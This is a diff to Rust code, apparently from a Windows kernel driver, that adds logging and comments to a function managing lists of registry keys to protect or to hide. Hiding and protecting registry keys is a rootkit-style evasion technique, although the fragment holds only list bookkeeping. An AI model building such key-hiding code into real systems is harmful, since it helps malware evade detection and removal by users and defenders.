@@ -221,30 +221,45 @@ impl Registry<String> {
     ///
     /// * Status code indicating success (`STATUS_SUCCESS`) or failure (`STATUS_UNSUCCESSFUL`).
     pub fn modify_key(target: *mut TargetRegistry, list_type: Type) -> NTSTATUS {
+        // Retrieve the registry key and enable flag from the target
         let key = unsafe { &(*target).key }.to_string();
         let enable = unsafe { (*target).enable };
-
+    
         let status = match list_type {
             Type::Protect => {
                 let mut list = PROTECTION_KEYS.lock();
                 if enable {
-                    Vec::add_item(&mut list, key)
+                    // Attempt to add the key to the protection list
+                    let status = Vec::add_item(&mut list, key.clone());
+                    // Check if the addition was successful (adjust STATUS_SUCCESS as needed)
+                    if status == STATUS_SUCCESS {
+                        log::info!("Registry key '{}' added to PROTECTION_KEYS list", key);
+                    }
+                    status
                 } else {
+                    // Removing the key; no logging required here
                     Vec::remove_item(&mut list, &key)
                 }
             }
             Type::Hide => {
                 let mut list = HIDE_KEYS.lock();
                 if enable {
-                    Vec::add_item(&mut list, key)
+                    // Attempt to add the key to the hide list
+                    let status = Vec::add_item(&mut list, key.clone());
+                    if status == STATUS_SUCCESS {
+                        log::info!("Registry key '{}' added to HIDE_KEYS list", key);
+                    }
+                    status
                 } else {
+                    // Removing the key; no logging required here
                     Vec::remove_item(&mut list, &key)
                 }
             }
         };
-
+    
         status
     }
+    
 
     /// Checks if a key exists in the list of protected keys.
     ///
